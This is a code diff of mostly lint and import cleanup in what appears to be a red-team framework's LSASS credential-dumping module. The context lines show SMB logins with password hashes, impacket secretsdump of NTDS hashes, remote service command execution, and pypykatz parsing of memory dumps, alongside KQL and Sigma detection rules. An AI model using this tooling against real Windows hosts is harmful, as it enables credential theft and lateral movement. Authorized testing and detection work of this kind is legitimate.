@@ -20,21 +20,24 @@ OPSEC: HIGH - EDR monitors OpenProcess to LSASS (Sysmon Event ID 10).
 """
 from __future__ import annotations
 
+from typing import TYPE_CHECKING
+
+if TYPE_CHECKING:
+    from ares.modules.base import FeasibilityReport
+
+
 import asyncio
-import base64
 import os
-import tempfile
 from typing import Any
 
-from ares.core.campaign import Finding, Severity, NoiseProfile
+from ares.core.campaign import NoiseProfile, Severity
 from ares.core.logger import audit, get_logger
 from ares.core.security import sanitize_hostname
+from ares.core.tracing import trace_module
 from ares.modules.base import BaseModule, OpsecLevel
 from ares.modules.params import LsassDumpParams
-from ares.core.tracing import trace_module
 from ares.sdk import (
     EvidenceRecord,
-    ExecutionContext,
     LockoutCircuitBreaker,
     ModuleResult,
     NetworkPermission,
@@ -83,15 +86,15 @@ class LsassDumpModule(BaseModule):
         super().__init__(*args, **kwargs)
         self._last_kerberos_tickets: list[dict[str, Any]] = []
 
-    async def assess_feasibility(self, ctx: "Any") -> "FeasibilityReport":
+    async def assess_feasibility(self, ctx: "Any") -> "FeasibilityReport":  # noqa: F821
         """
         Pre-flight Defense Feasibility Assessment:
         Evaluates Credential Guard (VBS/LsaIso), LSA Protection (RunAsPPL),
         Sysmon Event ID 10 / EDR process access hooks, and noise profile constraints.
         Recommends stealthier alternatives (windows.dpapi, windows.token_impersonation, ad.kerberoast).
         """
-        from ares.modules.base import FeasibilityReport
         from ares.core.campaign import NoiseProfile
+        from ares.modules.base import FeasibilityReport
 
         blockers: list[str] = []
         recommendations: list[str] = []
@@ -283,13 +286,13 @@ class LsassDumpModule(BaseModule):
         # Closed-Loop Purple Telemetry: KQL & Sigma rule synthesis
         dump_target = target or "TargetHost"
         kql_query = (
-            f"// ARES Closed-Loop Telemetry: Detect LSASS Process Memory Dumping\n"
-            f"// Detects Sysmon Event 10 (ProcessAccess targeting lsass.exe with PROCESS_VM_READ)\n"
-            f"SysmonEvent\n"
-            f"| where EventID == 10\n"
-            f"| where TargetImage endswith \"\\\\lsass.exe\"\n"
-            f"| where GrantedAccess in (\"0x1FFFFF\", \"0x1010\", \"0x1410\", \"0x0010\")\n"
-            f"| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess, CallTrace\n"
+            "// ARES Closed-Loop Telemetry: Detect LSASS Process Memory Dumping\n"
+            "// Detects Sysmon Event 10 (ProcessAccess targeting lsass.exe with PROCESS_VM_READ)\n"
+            "SysmonEvent\n"
+            "| where EventID == 10\n"
+            "| where TargetImage endswith \"\\\\lsass.exe\"\n"
+            "| where GrantedAccess in (\"0x1FFFFF\", \"0x1010\", \"0x1410\", \"0x0010\")\n"
+            "| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess, CallTrace\n"
         )
         sigma_rule = (
             f"title: LSASS Memory Dumping Activity ({dump_target})\n"
@@ -484,12 +487,15 @@ class LsassDumpModule(BaseModule):
             "details": {},
         }
         try:
-            from impacket.smbconnection import SMBConnection
-            from impacket.dcerpc.v5 import transport, rrp
+            from impacket.dcerpc.v5 import rrp, transport
             from impacket.dcerpc.v5.rrp import (
-                hOpenLocalMachine, hBaseRegOpenKey, hBaseRegQueryValue,
-                hBaseRegCloseKey, DCERPCException,
+                DCERPCException,
+                hBaseRegCloseKey,
+                hBaseRegOpenKey,
+                hBaseRegQueryValue,
+                hOpenLocalMachine,
             )
+            from impacket.smbconnection import SMBConnection
 
             smb = SMBConnection(target, target, timeout=10)
             smb.login(username, password, domain, lmhash, nthash)
@@ -559,7 +565,7 @@ class LsassDumpModule(BaseModule):
     def _secretsdump_sync(self, target: str, username: str, password: str,
                            domain: str, lmhash: str, nthash: str) -> list[dict]:
         """Direct secretsdump via impacket - no touch disk, DA required."""
-        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
+        from impacket.examples.secretsdump import NTDSHashes, RemoteOperations
         from impacket.smbconnection import SMBConnection
 
         smb = SMBConnection(target, target, timeout=30)
@@ -613,14 +619,13 @@ class LsassDumpModule(BaseModule):
         4. Parse with pypykatz
         5. Secure-delete dump
         """
-        import io
         import uuid as _uuid
+
         from impacket.smbconnection import SMBConnection
-        from impacket.dcerpc.v5 import transport, scmr
 
         dump_id   = _uuid.uuid4().hex[:8].upper()
         dump_name = f"ARES{dump_id}.dmp"
-        tmp_path  = f"\\Windows\\Temp\\{dump_name}"
+        tmp_path  = f"\\Windows\\Temp\\{dump_name}"  # noqa: F841
 
         conn_smb = SMBConnection(target, target, timeout=20)
         conn_smb.login(username, password, domain, lmhash, nthash)
@@ -660,7 +665,7 @@ class LsassDumpModule(BaseModule):
         self._last_dump_data = b""
         try:
             local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
-            import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB
+            import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB  # noqa: I001
 
             try:
                 with open(local_dump, "wb") as f:
@@ -712,9 +717,10 @@ class LsassDumpModule(BaseModule):
         out_file = None
         cleaned_up = False
         try:
+            import io
+            import uuid as _uuid
+
             from impacket.smbconnection import SMBConnection
-            from impacket.dcerpc.v5 import transport, scmr
-            import io, uuid as _uuid
 
             id_     = _uuid.uuid4().hex[:6]
             out_file = f"ARESPID{id_}.txt"
@@ -771,7 +777,7 @@ class LsassDumpModule(BaseModule):
                          cmd: str, svc_suffix: str) -> None:
         """Execute command via remote SCM service."""
         try:
-            from impacket.dcerpc.v5 import transport, scmr
+            from impacket.dcerpc.v5 import scmr, transport
 
             rpct = transport.DCERPCTransportFactory(f"ncacn_np:{target}[\\pipe\\svcctl]")
             rpct.set_credentials(username, password, domain, lmhash, nthash)
@@ -829,7 +835,7 @@ class LsassDumpModule(BaseModule):
         hashes: list[dict] = []
         kerberos_tickets: list[dict] = []
         try:
-            from pypykatz.pypykatz import pypykatz  # type: ignore[import]
+            from pypykatz.pypykatz import pypykatz
             mimi = pypykatz.parse_minidump_file(dump_file)
             for luid in mimi.logon_sessions.values():
                 # Extract MSV (NTLM) credentials
@@ -885,7 +891,7 @@ class LsassDumpModule(BaseModule):
             if hasattr(instance, "_last_kerberos_tickets"):
                 instance._last_kerberos_tickets = kerberos_tickets
             elif not isinstance(instance, type):
-                setattr(instance, "_last_kerberos_tickets", kerberos_tickets)
+                instance._last_kerberos_tickets = kerberos_tickets
 
         if raw is not None:
             raw["kerberos_tickets"] = kerberos_tickets
